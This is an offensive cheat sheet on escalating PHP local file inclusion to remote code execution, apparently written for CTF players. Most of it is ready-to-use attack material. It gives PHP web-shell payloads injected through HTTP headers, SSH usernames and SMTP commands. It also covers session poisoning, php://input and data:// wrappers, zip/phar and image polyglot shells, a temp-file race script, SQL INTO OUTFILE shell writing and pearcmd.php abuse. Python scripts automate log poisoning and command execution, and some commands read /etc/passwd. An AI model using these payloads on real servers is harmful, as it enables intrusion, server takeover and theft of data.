# LFI to RCE - Advanced Techniques

## Overview

Converting Local File Inclusion (LFI) into Remote Code Execution (RCE) requires finding or creating a file containing executable code, then including it. This guide covers all major techniques.

---

## 1. Log Poisoning

### Apache/Nginx Access Logs

#### Concept
Inject PHP code into log files by poisoning HTTP headers, then include the log.

#### Log Locations
```
# Apache
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/httpd/access_log
/usr/local/apache/logs/access_log
/usr/local/apache2/logs/access_log

# Nginx
/var/log/nginx/access.log
/var/log/nginx/error.log
```

#### Step-by-Step Exploitation

**Step 1: Test if log is readable**
```
?page=/var/log/apache2/access.log
```

**Step 2: Poison the log via User-Agent**
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```

Or use Burp/Browser DevTools:
```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 3: Include the log and execute command**
```
?page=/var/log/apache2/access.log&cmd=id
?page=/var/log/apache2/access.log&cmd=cat /flag.txt
?page=/var/log/apache2/access.log&cmd=ls -la
```

#### Alternative Injection Points

**Via Referer Header**
```
Referer: <?php system($_GET['cmd']); ?>
```

**Via X-Forwarded-For**
```
X-Forwarded-For: <?php system($_GET['cmd']); ?>
```

**Via Request URI**
```
GET /<?php system($_GET['cmd']); ?> HTTP/1.1
```

---

### SSH Auth Logs

#### Log Location
```
/var/log/auth.log
/var/log/secure
```

#### Exploitation

**Step 1: Poison via SSH username**
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

You'll get "Permission denied" but the username is logged.

**Step 2: Include auth.log**
```
?page=/var/log/auth.log&cmd=id
```

---

### Mail Logs

#### Log Location
```
/var/log/mail.log
/var/mail/www-data
/var/spool/mail/www-data
```

#### Exploitation

**Step 1: Send email with PHP payload**
```bash
telnet target.com 25
MAIL FROM:attacker@evil.com
RCPT TO:<?php system($_GET['cmd']); ?>@target.com
DATA
test
.
QUIT
```

**Step 2: Include mail log**
```
?page=/var/log/mail.log&cmd=id
```

---

## 2. PHP Session Poisoning

### Session File Locations
```
/var/lib/php/sessions/sess_[SESSION_ID]
/var/lib/php5/sessions/sess_[SESSION_ID]
/tmp/sess_[SESSION_ID]
/tmp/sessions/sess_[SESSION_ID]

# Custom locations (check phpinfo)
# session.save_path value
```

### Finding Session ID
```
# From cookies
PHPSESSID=abc123...

# Session file path
/var/lib/php/sessions/sess_abc123...
```

### Exploitation

**Step 1: Poison session data**

Inject PHP code into any session variable:
```php
// Via vulnerable form/input
$_SESSION['username'] = '<?php system($_GET["cmd"]); ?>';
$_SESSION['language'] = '<?php system($_GET["cmd"]); ?>';
```

**Step 2: Include session file**
```
?page=/var/lib/php/sessions/sess_YOUR_SESSION_ID&cmd=id
```

### Example with Registration Form
```
# If registration stores username in session
Register with username: <?php system($_GET['cmd']); ?>

# Then include session
?page=/var/lib/php/sessions/sess_YOUR_SESSION_ID&cmd=id
```

---

## 3. PHP Wrappers

### php://input

#### Concept
`php://input` reads raw POST data, allowing arbitrary PHP execution.

#### Exploitation

**Request:**
```
POST /index.php?page=php://input HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

<?php system('id'); ?>
```

**Or with command parameter:**
```
POST /index.php?page=php://input&cmd=id HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```

---

### php://filter

#### Concept
PHP filter wrapper allows reading files with encoding/conversion.

#### Read Source Code (most common use)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=/etc/passwd
```

Decode the base64 output to see source code.

#### Multiple Filters
```
php://filter/read=string.rot13|string.toupper/resource=index.php
php://filter/convert.base64-encode|convert.base64-decode/resource=index.php
```

#### Write Files (rare, needs specific conditions)
```
php://filter/write=string.rot13/resource=shell.php
```

---

### data:// Wrapper

#### Concept
Execute code directly from data URI.

#### Requirements
- `allow_url_include = On` (usually disabled)

#### Exploitation

**Plain text:**
```
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
```

**Base64 encoded:**
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

Base64 payload: `<?php system($_GET['cmd']); ?>`

---

### expect:// Wrapper

#### Concept
Execute commands directly (requires `expect://` extension - very rare).

#### Exploitation
```
?page=expect://id
?page=expect://whoami
?page=expect://cat /etc/passwd
```

---

### zip:// and phar:// Wrappers

#### Concept
Include PHP files from within ZIP/PHAR archives.

#### Exploitation

**Step 1: Create malicious archive**
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Create ZIP
zip shell.zip shell.php

# Or create JPG with ZIP structure
cat image.jpg shell.zip > malicious.jpg
```

**Step 2: Upload the archive**
Upload shell.zip or malicious.jpg to the server

**Step 3: Include via zip wrapper**
```
?page=zip://uploads/shell.zip%23shell.php&cmd=id
?page=zip://uploads/malicious.jpg%23shell.php&cmd=id
```

Note: `%23` is URL-encoded `#`

**phar:// example:**
```
?page=phar://uploads/shell.phar/shell.php&cmd=id
```

---

## 4. /proc/self/environ

### Concept
`/proc/self/environ` contains environment variables of the current process, including HTTP headers.

### Exploitation

**Step 1: Poison via User-Agent**
```
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2: Include environ**
```
?page=/proc/self/environ&cmd=id
```

---

## 5. File Upload + LFI

### Concept
Upload a file with PHP code, then include it via LFI.

### Exploitation

**Step 1: Upload malicious file**

Even if extension is restricted, upload:
```
shell.php.jpg
shell.jpg (containing PHP code)
image.png (with PHP code in EXIF/metadata)
```

**Step 2: Find upload location**
Common paths:
```
/uploads/
/upload/
/files/
/images/
/tmp/
/var/www/html/uploads/
```

**Step 3: Include the uploaded file**
```
?page=uploads/shell.jpg&cmd=id
?page=../../../../var/www/html/uploads/shell.php.jpg&cmd=id
```

### Image with PHP Code

**Create malicious image:**
```bash
# Add PHP to image
echo '<?php system($_GET["cmd"]); ?>' > shell.php
cat image.jpg shell.php > malicious.jpg

# Or in EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

**Include:**
```
?page=uploads/malicious.jpg&cmd=id
```

---

## 6. PHP Temporary Files

### Concept
PHP creates temporary files for file uploads. Race condition: include temp file before it's deleted.

### Exploitation

**Step 1: Upload file with long processing**
```python
import requests
import threading

url = "http://target.com/index.php"

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    data = {'page': '/tmp/phpXXXXXX'}  # Need to guess
    requests.post(url, files=files, data=data)

def include():
    # Race to include temp file
    for i in range(1000):
        requests.get(f"{url}?page=/tmp/php{i}&cmd=id")

# Start both simultaneously
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=include)
t1.start()
t2.start()
```

---

## 7. Segmentation Fault Method

### Concept
Trigger a segfault to leave files in `/tmp` or `/var/tmp`.

### Exploitation

**Trigger segfault:**
```
?page=php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
```

**Check for leftover files:**
```
?page=/tmp/phpXXXXXX
?page=/var/tmp/phpXXXXXX
```

---

## 8. Via Database

### Concept
If you can write to database and include files, write PHP to DB then include.

### Exploitation

**Step 1: SQL injection to write shell**
```sql
-- MySQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Or write to accessible location
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/tmp/shell.php'
```

**Step 2: Include**
```
?page=/var/www/html/shell.php&cmd=id
?page=/tmp/shell.php&cmd=id
```

---

## 9. Pearcmd.php (PHP PEAR)

### Concept
PEAR installation leaves `pearcmd.php` which can write files.

### Check if exists
```
?page=/usr/local/lib/php/pearcmd.php
?page=/usr/share/php/pearcmd.php
```

### Exploitation

**Write shell:**
```
?page=/usr/local/lib/php/pearcmd.php&+config-create+/&file=/var/www/html/shell.php&/<?=system($_GET['cmd']);?>
```

---

## 10. Via fd:// (File Descriptors)

### Concept
Access file descriptors of the current process.

### Exploitation
```
?page=/proc/self/fd/0  # stdin
?page=/proc/self/fd/1  # stdout
?page=/proc/self/fd/2  # stderr
?page=/proc/self/fd/3  # could be an open file
?page=/proc/self/fd/4
# ... enumerate
```

---

## CTF-Specific Techniques

### 1. Read Source Code for Hints
```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=flag.php
```

### 2. Common Flag Locations
```
?page=/flag
?page=/flag.txt
?page=../flag.txt
?page=/proc/1/environ
```

### 3. Chain Multiple Techniques
```
1. Upload image with PHP
2. Poison log with User-Agent
3. Include log to execute PHP that includes image
```

### 4. Time-Based Detection (Blind LFI)
```
# If /etc/passwd exists, response slower
?page=/etc/passwd

# Use sleep in PHP
?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc2xlZXAoNSk7ID8+
```

---

## Automation

### Python Script - Log Poisoning
```python
import requests

target = "http://target.com/index.php"

# Step 1: Poison log
headers = {
    'User-Agent': '<?php system($_GET["cmd"]); ?>'
}
requests.get(target, headers=headers)

# Step 2: Execute command
params = {
    'page': '/var/log/apache2/access.log',
    'cmd': 'cat /flag.txt'
}
r = requests.get(target, params=params)
print(r.text)
```

### Python Script - php://input
```python
import requests

target = "http://target.com/index.php?page=php://input&cmd=id"

payload = "<?php system($_GET['cmd']); ?>"

r = requests.post(target, data=payload)
print(r.text)
```

---

## Quick Reference

### Test LFI
```
?page=../../../../etc/passwd
```

### Read Source
```
?page=php://filter/convert.base64-encode/resource=index.php
```

### Log Poison
```
1. User-Agent: <?php system($_GET['cmd']); ?>
2. ?page=/var/log/apache2/access.log&cmd=id
```

### php://input
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

### Session Poison
```
1. Set session: username=<?php system($_GET['cmd']); ?>
2. ?page=/var/lib/php/sessions/sess_[ID]&cmd=id
```

### data:// wrapper
```
?page=data://text/plain,<?php system('id'); ?>
```

### zip:// wrapper
```
?page=zip://uploads/file.zip%23shell.php
```

---

## Tools

- **Burp Suite**: Manual testing and fuzzing
- **LFISuite**: Automated LFI scanner and exploiter
- **Kadimus**: LFI scanner with RCE capabilities
- **fimap**: LFI/RFI scanner
- **dotdotpwn**: Directory traversal scanner

Remember: LFI to RCE often requires creativity and chaining multiple techniques!
